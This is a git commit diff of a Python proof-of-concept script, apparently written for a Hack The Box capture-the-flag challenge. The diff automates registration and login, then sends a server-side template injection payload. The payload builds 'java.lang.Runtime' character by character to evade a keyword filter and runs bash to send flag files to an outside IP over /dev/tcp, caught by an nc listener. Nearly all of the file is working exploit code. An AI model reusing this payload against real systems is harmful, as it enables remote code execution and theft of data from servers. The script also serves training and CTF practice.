19745c341239ef961c0b9c8b57be0e024dd960fd
Adam Rose <93153300+AdamRose1@users.noreply.github.com>
2024-10-14 12:20:09 -0400

    Update Breathtaking_view.py

--- HTBChallenges: POC-Scripts/Breathtaking_view.py
+++ HTBChallenges: POC-Scripts/Breathtaking_view.py
@@ -8,7 +8,14 @@ import requests
 
 target="94.237.54.201:53047" # update target ip
 proxies= {"http":"http://127.0.0.1:8080"}
-cookies={"JSESSIONID":"C9ECF214C6182A8D6B4DC6F07511B38C"}   # log in to get cookie and replace value here
+session= requests.Session()
+data= {"username":"test2","password":"test2"}
+
+# Register a user
+response= session.post(url=f"http://{target}/register", proxies=proxies, data=data, allow_redirects=True)
+
+# Login and get the cookie value 
+response2= session.post(url=f"http://{target}/login", proxies=proxies, data=data, allow_redirects=True)
 
 # This is needed in order to bypass a filter that blocks any payload containing the word java in it
 payload = "java.lang.Runtime"
@@ -16,8 +23,8 @@ result = "true.toString().charAt(0).toChars(%d)[0].toString()" % ord(payload[0])
 for i in range(1, len(payload)):
     result += ".concat(true.toString().charAt(0).toChars(%d)[0].toString())" % ord(payload[i])
 
-params=f'lang=__${{true.getClass().forName({result}).getMethods()[6].invoke(true.getClass().forName({result})).exec(\'bash -c cat$IFS/flag*$IFS>%26$IFS/dev/tcp/54.221.158.166/4444 0>%261\')}}__::.x'  # update ip address and then set up nc listener
+params=f'lang=__${{true.getClass().forName({result}).getMethods()[6].invoke(true.getClass().forName({result})).exec(\'bash -c cat$IFS/flag*$IFS>%26$IFS/dev/tcp/54.227.158.166/4444 0>%261\')}}__::.x'  # update ip address and then set up nc listener
 
-response= requests.get(url=f"http://{target}", params=params, proxies=proxies, cookies=cookies, verify=False, allow_redirects=True)
+response3= session.get(url=f"http://{target}", params=params, proxies=proxies, allow_redirects=True)
 
-print(response.text)
+print(response3.text)
